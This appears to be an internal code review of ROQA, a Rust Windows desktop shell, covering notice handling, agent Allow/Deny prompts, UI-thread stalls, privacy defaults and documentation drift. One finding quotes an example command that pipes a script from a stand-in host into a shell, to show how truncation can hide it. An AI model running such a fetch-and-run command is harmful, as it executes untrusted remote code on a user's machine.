# Project review 2026-11-19

Whole codebase at `da268b8` (215 commits, about 47,000 lines of Rust in 71 files). Read-only review; every finding below
was checked against the code. Load assumed: one person on one PC, ROQA running all day, several coding agents reporting
at once.

Diff-level findings for `147952a..6712f90` are in [code-review-2026-11-18.md](code-review-2026-11-18.md) and are not
repeated here. Its items 1 (language pill stops), 2 (Win+B then Enter), 3 (hook write race), 4 (accidental Allow) and
8 (eject on the UI thread) are still in the code (`keys.rs:46`, `dock.rs:805`, `settings_window.rs:1770`,
`host.rs:5011`, `host.rs:5001`).

Legend: size S = a few lines, M = one function or file, L = a redesign. [live] = seen on screen in one run on display 2,
[code] = reasoned from code only.

## Top findings (all areas)

1. **Agent questions get lost, or show the wrong buttons** (Must fix, S to M) [live + code]
   - Every notice (battery, volume, devices, keyboard, agents, progress, prayer, timers, errors) shares one row with
     one text and one set of buttons, and the newest wins.
   - Live: a Claude Code question "Bash: git push origin main" with Deny and Allow was replaced 2 s later by
     `roqa.exe progress build 40`. The buttons were gone; the hook waited the full 30 s and gave no answer.
     Any agent's "done" or a finished timer (`host.rs:2152`), a volume key (`host.rs:5839`) or a plugged-in device
     (`host.rs:5267`) does the same. Two agents asking at once: the first question vanishes.
   - Worse, on a laptop: a battery change replaces the text but keeps the old buttons (`power.rs:130-138`; `announce`
     at `power.rs:143` clears them, `update` does not). The row reads "On battery 54%" with Deny and Allow, and Allow
     approves the hidden command. Same for Eject and Snooze.
2. **A long command can be allowed half-read** (Should fix, S) [code]
   - The question is cut to 400 characters with the middle removed (`agent_hooks.rs:576-602`), then cut again to fit
     two lines, again from the middle (`graphics.rs:2432-2451`). The notch shows under 100 characters, yet Allow is one
     click and is the accent "primary" button (`graphics.rs:1315-1319`).
   - Case: `cd app && npm test ... && curl -s x.example/p.sh | sh && git status` can show as
     `cd app && npm test…&& git status`.
   - Fix: when either cut happened, show Deny only (or "Answer in the terminal").
3. **A missed wake-up switches features off until ROQA restarts** (Should fix, S) [code]
   - Battery notices, drive and camera alerts (with Eject), the Copied list and the mascot's wake each post one message
     and refuse to post again until it is handled (`native_window.rs:88`, `:662`, `:687`, `:694`, `:708`).
   - Windows drops these messages while any message box or drag loop runs on ROQA's thread: the Settings confirm boxes
     (`settings_window.rs:1794`, `:1807`, `:2478`), moving the Settings window by its title bar, or dragging its
     scroll bar (`settings_window.rs:2634`). The flag then stays set for good.
   - Case: the battery level changes while "Reset to defaults?" is open; battery notices never come back.
     Copying text while the "Add hook" box is open; the Copied list stops.
   - The window list already does this right: it re-reads its flags on every pass (`window_catalog.rs:331`).
     Fix: do the same for these four, and for `keys.rs` (review of 11-18, item 1).
4. **`host.rs` is the bottleneck** (Architecture, M, mechanical) [code]
   - 6,568 lines; the `Desktop` struct has 78 fields and 141 methods; 95 of the last 158 commits touched it.
   - Every feature is wired by hand into up to seven places (field, start-up, the per-wake pass, the wait, the message
     handler, the click chain, the paint scene). Parallel threads collide here, and a forgotten place becomes a bug
     like finding 1.
   - Fix: split by job into `impl Desktop` blocks in sibling files (notices, notch clicks, menus, settings bridge). No
     new types; do it when no other thread is editing `host.rs`.
5. **Quick settings can freeze ROQA for up to 0.7 s per radio call** (Should fix, S) [code]
   - Opening the dock's quick settings asks Windows for its radios twice, waiting on ROQA's only UI thread in 2 ms
     sleeps up to 700 ms each (`quick.rs:16-34`, called at `host.rs:3788`); a Wi-Fi or Bluetooth switch waits up to
     three more times (`quick.rs:57-69`). Animations and clicks stop meanwhile.
   - Fix: keep the `Radio` objects after the first lookup; reading `State()` is instant.
6. **Copied text is saved to disk by default** (Owner decides) [code]
   - The Copied list is on by default (`settings.rs:144`) and its last 12 copies, up to 400 characters each
     (`clipboard.rs:7-9`), are written in plain text to `%LOCALAPPDATA%\ROQA\store.roqa` (`store.rs:242`), kept across
     restarts, and also in `store.roqa.bad` if the file is ever quarantined (`store.rs:145`).
   - Password managers that mark their copies are skipped (`clipboard_os.rs:93`, good), but tokens copied from a
     terminal or a browser are not marked. Windows' own clipboard history is opt-in and is not kept across restarts.
   - Choice: keep the list in memory only (delete the `clip=` lines), or make it off by default.
7. **Reminders read "at 5:30 pm" as 5:30 am, and open on the main screen** (Should fix, S) [code]
   - `remind.rs:21-34` reads only 24-hour times; "pm" becomes part of the label. "at 5:30 pm call mum", typed at
     11:08 am, rings at 5:30 the next morning as "Pm call mum". This PC's clock shows "11:08 am", so people will
     type it that way. The tests have no 12-hour case (`remind.rs:131-147`).
   - The reminder box always opens on the primary monitor (`remind_box.rs:137`), even when Remind was clicked on
     display 2. Settings was fixed for the same problem (`host.rs:2823`).
8. **Uninstall leaves agent hooks behind** (Should fix, S) [code]
   - `uninstall.ps1:183` removes the start-up entry only. Hooks written into up to 7 agents' files (`.claude`,
     `.codex`, `.gemini`, `.cursor`, `.copilot`, opencode; `agent_hooks.rs:334`) keep calling a deleted `roqa.exe`,
     so every agent session shows hook errors. The README says nothing is left behind (`README.md:152`).
   - Fix: the script lists the files that still name `roqa` and says to press Undo in Settings first.

## What the project does well

- One UI thread, event driven: every feature returns its next deadline and the loop sleeps until the soonest
  (`host.rs:5857-5874`); frames run only while something moves, on the compositor clock (`host.rs:6120`).
- Pure state machines with the Windows calls split into `*_os.rs` files, so most logic is unit tested: 465 tests.
- No dependencies besides Microsoft's `windows` crates, pinned exactly, with a committed lockfile and `--locked` builds.
- Unsafe code is disciplined: all 447 `unsafe` blocks carry a safety note, enforced by clippy
  (`Cargo.toml` lints `undocumented_unsafe_blocks` and `unsafe_op_in_unsafe_fn` = deny).
- Inputs from outside are bounded and checked: command names and agent names (`agent.rs:80`), the 4 KB spool,
  64 KB stdin, the hook JSON depth and file size, the store's size cap, end marker, version guard and quarantine
  (`store.rs:124-215`), HTTP bodies capped at 64 KB with timeouts over the OS TLS stack (`weather_os.rs:38-40`),
  file drops capped (`shelf_os.rs:68-71`), agent CLIs started by full path inside a job object with time and output
  caps (`limits_os.rs:390-457`).
- Privacy care: the error log never stores user text (`error_log.rs:35`, `main.rs:4`), the clipboard skips private
  copies, the hook editor shows the exact text it adds and keeps a backup (`settings_window.rs:1752-1768`).
- Single instance per user session through SID-named objects (`ipc.rs:190-200`).
- The window list, media and audio recover from lost wake-ups (`window_catalog.rs:331`, `host.rs:6022`).

## 1. Architecture

**Shape.** `main.rs` hands every launch either to `host::run` or to a one-shot client command. `host.rs` is the only
place that owns state and talks to Windows events; about 40 feature modules below it are mostly pure (`timer`, `remind`,
`power`, `agent`, `clipboard`, `shelf`, `pins`, `prayer`, `water`, ...) with OS halves in `*_os.rs`; `layout.rs`
computes every rectangle and `graphics.rs` draws a scene built by the host. Hit tests and painting share the same
`layout` rectangles (`layout.rs:810`, `graphics.rs:1323`), which keeps clicks and pixels in step. Nothing imports
`host`. This layering is sound.

**A1. `host.rs` does too many jobs** (see top 4). The long functions are the integration points: `Desktop::message`
(~300 lines, `host.rs:5221`), `paint_notch` (~250, `host.rs:666`), `run_menu` (~210, `host.rs:4256`), `click_control`
(~200, `host.rs:4972`), `apply_settings` (~150, `host.rs:2965`). What breaks as features grow:
- every wake runs all 26 `refresh_*` passes (`host.rs:5857-5874`); one that returns a short wait by mistake makes ROQA
  spin at idle, and nothing but a manual idle measurement would catch it;
- clicks are an ordered `if` chain keyed on page and position (`host.rs:4972-5171`); a new control must be placed in
  the right spot, and overlaps are settled by order (the review of 11-18, item 4, is one such overlap);
- merge pressure: AGENTS.md already needs a rule for "verify fails in files you did not touch".

**A2. One notice row, about 20 producers, no rule** (root of top 1). `power.rs` started as the battery pill and is now
the notice system for everything (`power.rs:143-150`), with last-writer-wins. Only keyboard and notification pills
check for a pending button (`host.rs:2289`). Fix: one rule in `Power`: a notice with buttons is not replaced by one
without, `update` clears the buttons it does not own, and a second question waits or falls back to the agent. Rename
the module to `notice` when it is next touched.

**A3. Message routing lives in a filter before dispatch** (`host.rs:6140-6267`), not in window procedures. About 15
checks run in order on every message. Any loop Windows runs on ROQA's thread (message boxes, move and scroll-bar
drags) skips the filter, so posted thread messages are lost (top 3). Two recovery styles coexist: the window list,
media and audio re-check state every pass; `native_window.rs` and `keys.rs` rely on the message arriving. Rule to
adopt: a posted message only wakes the loop; the work keys off a flag read on every pass.

**A4. Adding a setting touches five places** (`Settings` field, `Default`, `set`, `write_lines`, `clamped` in
`settings.rs`, plus `apply_settings` and a Settings row), and four settings are pushed into globals
(`settings.rs:262-267`). Workable, but the store round-trip test leaves about half the fields at their defaults
(`settings.rs:1021`), so a forgotten `write_lines` line for one of those fields passes the tests and the setting is
lost on restart. Fix (S): make that test change every field.

**A5. Names that outlived their job** (nit): `power.rs` holds all notices, `picker.rs` holds the shared dialog plumbing
though the picker is gone, `tests/PickerProbe.cs` is smoke.ps1's click helper. Rename when next touched.

## 2. Code quality

Ranked by severity; sizes in brackets.

**Must fix**
- Q1. Question replaced by a later notice (top 1) [S-M]: `host.rs:2195-2201` shows it with a 30 s hold, and every
  `announce` replaces it (`power.rs:143`). Confirmed live.
- Q2. Battery change keeps the previous Allow/Deny, Eject or Snooze buttons (top 1) [S]: `power.rs:138` sets the text,
  not `extra`; buttons are drawn from `extra` (`graphics.rs:1316-1319`) and clicked through it (`host.rs:5011-5021`).
  Needs a battery; not reproducible on this PC.

**Should fix**
- Q3. Lost wake flags (top 3) [S]. Also `window_catalog.rs:97` (`FRAME_POSTED`): the counter keeps counting, but a
  window resized over the dock no longer wakes ROQA by itself until some other event does.
- Q4. Half-read Allow (top 2) [S].
- Q5. 12-hour reminders (top 7) [S].
- Q6. Reminder box on the wrong monitor (top 7) [S].
- Q7. After the hook has given up (agent interrupted, or the 30 s ran out), a click still says "Allowed": `ipc::answer`
  ignores a missing event (`ipc.rs:106-121`, `host.rs:5021-5022`) [S: say "Too late. Answer in the terminal."].

**Nice to have**
- Q8. Hiding both surfaces by command quits ROQA (`host.rs:4940`, `host.rs:6058`); `--show-dock` then reports that ROQA
  is not running [S: refuse to hide the last surface, as Settings already does in `settings.rs:191`].
- Q9. The store is renamed into place without a flush (`store.rs:291`). After a power cut right after a save, the new
  file can be empty; the next start quarantines it and pins and settings are back to defaults [S: write through a
  `File` and `sync_all()` before the rename].
- Q10. No sign-out handler (no `WM_ENDSESSION` anywhere): a change made in the last 1.5 s (up to 10 s in a burst,
  `store.rs:19-21`) before sign-out is not saved [S].
- Q11. `store.rs:5` says unknown keys "survive an older reader"; they are dropped at its next save because only known
  fields are written (`store.rs:222-270`) [S: fix the comment].

**Tests.** 465 unit tests, strong on the pure parts (layout 39, media 33, dock 31, graphics 24, settings 18, limits 17,
prayer tab 16, weather 15, store 14). They are thin exactly where the bugs above live: `power.rs` tests cover battery
states only, nothing tests wake-flag recovery, `remind.rs` has no 12-hour case, `host.rs` has 12 tests for 6,568 lines
and `settings_window.rs` 7 for 3,209. Three small tests would have caught Q1, Q2 and Q5: an Ask notice survives a plain
`announce` and a battery `update`; "at 5:30 pm x" gives 17:30.

## 3. Best practices

- B1. **UI thread waits** (top 5, plus eject in the review of 11-18, item 8). Everything else slow already runs on short
  workers (UNC open, file picker, weather, limits, brightness, icons, window list).
- B2. **Idle and polling.** Known periodic work: the clock each minute, a full window-list rescan every 30 s
  (`catalog_timing.rs:4`), a 2 s full-screen check only while a full-screen window is up (`host.rs:1155`), and the
  Start popup's 25 ms re-check for 2.5 s (review of 11-18, item 7). The README still says "Zero polling loops"
  (`README.md:16`). The 30 s rescan has a counter (`reconciliations`); if it never finds anything, widen it.
  Idle CPU was not measured in this review (no build).
- B3. **Per-frame allocation.** `animate` rebuilds the dock's icon table on every frame while a dock animates
  (`host.rs:2727`) [S: build it once per pass or reuse the vector]. Small.
- B4. **Crash evidence.** `error.log` is emptied at every start (`error_log.rs:28`), and a panic ends the process with
  `TerminateProcess` (`error_log.rs:74-79`), which leaves no Windows crash record. So a panic's only trace is erased as
  soon as ROQA starts again. Already listed as "owner decides" (`FEATURES_TO_ADD.md:155`); the cheap fix is to rename
  the old log to `error.prev.log` before creating the new one (2 lines).
- B5. **Privacy default** (top 6).
- B6. **Leftovers after uninstall** (top 8).
- B7. **Docs and scripts.**
  - `README.md:61` says settings are "Atomic JSON persistence under `%APPDATA%\ROQA\`"; they are a `key=value` file at
    `%LOCALAPPDATA%\ROQA\store.roqa`. `README.md:111` lists `--diagnostics <out>` as a command for a running ROQA; it
    starts a second host, which exits as "already running" without writing anything (`main.rs:97`).
  - `smoke.ps1`, `measure-idle.ps1` and `catalog-smoke.ps1` predate the second-monitor rule: they start ROQA on the
    owner's real store, on every monitor, and smoke checks the primary one (`smoke.ps1:45`, `smoke.ps1:343`,
    `measure-idle.ps1:187`, `catalog-smoke.ps1:57`). Do not run them until they use `monitor.ps1` and a private
    profile as `run.ps1` does.
  - Capture round r17: all 18 notch stills are the bare gray backdrop (every file 380 or 1,712 bytes) and the tool did
    not fail. The cause is known (`FEATURES_TO_ADD.md:160`); the missing piece is a check that a still is not just
    backdrop.
- B8. **Build hygiene.** Good: `verify.ps1` runs fmt, clippy `-D warnings`, tests and a locked release build with
  timeouts and logs. `build.rs` reruns on every `git add` (it watches `.git/index` for the About commit), which only
  costs a relink.
- No secrets in the code, no plain-HTTP URLs, no hooks into other processes beyond out-of-context WinEvents.

## 4. User flows and UX

One live run [live]: the 01:41 build of `da268b8` (a copy, no rebuild), fresh store, display 2 only, clipboard and
notification reading switched off, about 40 s. The stills stay out of the repo because they show the desktop.

- **First run** [live]: the pill shows "11:08 am"; hovering opens the Media page ("Nothing playing", clock, date, eyes,
  gear) with a rail of "Media" plus five unnamed dots. The dock shows Start, search, running apps, the hidden-icons
  chevron and quick settings. Clean and calm. Friction: nothing says what the dots are or that right-click holds
  Settings and Quit; a greeting is already on the list (`FEATURES_TO_ADD.md:162`). Prayer reminders are on by default
  but wait for a city; "Set city" on Weather and Prayer opens Settings at the city field (`host.rs:5052`,
  `host.rs:5086-5094`), which is good.
- **Dock** [live + code]: works; see the review of 11-18, items 2 and 7. Brand: running apps that are not focused also
  get an accent dot (`graphics.rs:2898-2903`); BRAND allows accent only on the selected indicator. Owner decides.
- **Notch tabs** [code]: fine. Notice buttons sit where page controls are and win (review of 11-18, item 4).
- **Quick settings** [code]: the freeze in top 5.
- **Timers and reminders** [code]: top 7. The error hint teaches only "in 20 min stretch" (`remind_box.rs:118`), not
  "at 17:30". The reminder box ignores Windows text size (`remind_box.rs:140` passes 1.0) while Settings follows it.
- **Media** [code, skimmed]: nothing new found.
- **Settings** [stills of r901 + code]: native controls, live apply, confirm boxes for reset and hooks with backups.
  About 80 rows on 9 pages and no search (known). Moving or scrolling it can trigger top 3. Status lines run long for
  the voice rule, for example "Enter minutes, m:ss or h:mm:ss, from 1 second to 24 hours."
  (`settings_window.rs:2471`).
- **Agent Allow/Deny** [live + code]: top 1 and 2, Q7, and item 4 of 11-18. Allow is the loud accent button on the
  right (`graphics.rs:1315-1319`); for a permission question the safe answer should not be the emphasized one.
- **Accessibility** [code]: the notch and the dock are drawn by ROQA with no UI Automation support (no `WM_GETOBJECT`
  handler anywhere), so Narrator cannot read the time, a notice or a question, and they cannot be reached by keyboard
  except through the opt-in global shortcuts. Windows' "Animation effects" switch is ignored by the owner's decision
  of 2026-11-09 (`motion.rs:172`), while AGENTS.md says "reduced motion respected" (`AGENTS.md:11`); the in-app
  "fast" choice is the only reduced-motion path. Settings uses native controls and handles high contrast
  (`settings_window.rs:770`). Owner decides the scope.

## Next actions, ranked by impact

1. Notice rule in `Power` (top 1, A2): battery update clears foreign buttons; a question, Eject or Snooze is not
   replaced by a plain notice; a second question waits or falls back. Two tests. S to M.
2. Offer Allow only when the whole command is shown (top 2). S.
3. Read the wake flags on every pass (top 3), together with item 1 of 11-18. S.
4. Items 2, 3 and 4 of the review of 11-18 (Enter into the user's app, hook write race, accidental Allow). S each.
5. Keep the radio objects in quick settings (top 5). S.
6. Reminders: accept am/pm, open the box on ROQA's monitor, add the 12-hour test (top 7). S.
7. Owner decisions: Copied list on disk (top 6); accessibility scope and the Windows animation switch; keep the last
   `error.log`; accent on running-app dots.
8. Hygiene: uninstall lists leftover hooks (top 8); fix README storage, polling and `--diagnostics` lines; retire or
   fix the three old test scripts; make the capture tool fail on backdrop-only stills. S each.
9. Split `host.rs` by job into sibling `impl Desktop` files (top 4), mechanical, when no other thread is in it. M.
10. Store durability: `sync_all` before the rename and a save on sign-out (Q9, Q10). S.

## Not checked

- No build, clippy or test run (read-only brief; other threads edit `src/`). Idle CPU and frame timing not measured.
- Read closely: `main`, `ipc`, `agent`, parts of `agent_hooks`, `store`, `clipboard*`, `power`, `keys`, the window
  procedure in `native_window`, the wake path of `window_catalog`, `catalog_timing`, `chan`, `error_log`, `quick`,
  `remind*`, the launch path of `limits_os`, the caps of `weather_os`, the drop and picker paths of `shelf_os`, and in
  `host.rs` the struct, start-up, loop, `update`, `animate`, clicks and notices. Skimmed or not read: `media`, `audio`,
  `layout`, `edge`, `eyes`, `prayer*`, most of `settings_window`, `toast` (left to the diff review thread), `icons`,
  `window_source`, `brightness`, `dock_tuck`, `widgets`, `theme`, `diagnostics`.
- Battery paths (no battery on this PC) and screen-reader behaviour were not tried live.
